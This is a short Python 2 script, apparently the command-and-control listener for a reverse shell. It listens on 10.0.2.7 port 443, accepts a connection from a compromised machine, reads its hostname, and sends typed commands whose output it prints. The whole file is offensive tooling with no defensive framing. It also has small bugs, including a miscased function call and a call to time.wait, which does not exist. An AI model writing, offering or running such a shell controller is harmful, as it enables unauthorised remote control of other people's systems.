import socket
import os
import sys
import time

def daemonize():
    pid = os.fork()
    if pid > 0:
        sys.exit(0)
    pid = os.fork()
    if pid >  0:
        sys.exit(0)
  
def socketCreate():
    try:
        global host
        global port
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = '10.0.2.7'
        port = '443'
        #port = raw_input('What Port do you want to list on ')
        if port == '':
            socketcreate()
        port = int(port)
    except socket.error as msg:
        print 'Failed to Create socket: ' + str(msg[0])
def socketBind():
    try:
        print '[!] Binding socket on port %s'%(port)
        s.bind((host,port))
        s.listen(1)
    except socket.error as msg:
        print 'Failed to bind socket: ' + str(msg[0])
        print 'Retrying..'
        time.sleep(2)
        socketBind()
def socketAccept():
    global conn
    global addr
    global hostname
    try:      
        conn,addr = s.accept()
        print '[!] session opened at %s:%s'%(addr[0],addr[1])
        print '\n'
        hostname = conn.recv(1024)
        menu()
    except: 
        print 'Failed to accept socket: ' #+ str(msg[0])
def menu():
    while 1:
        cmd = raw_input(str(addr[0])+'@' + str(hostname) + '> ')
        if cmd == 'quit':
            print '[!] Closing Sessions'
            time.wait(1)
            conn.close()
            s.close()
            sys.exit()
        command = conn.send(cmd)
        result = conn.recv(16834)
        if result <> hostname:
            print result
def main():
    socketCreate()
    socketBind()   
    socketAccept()
main() 
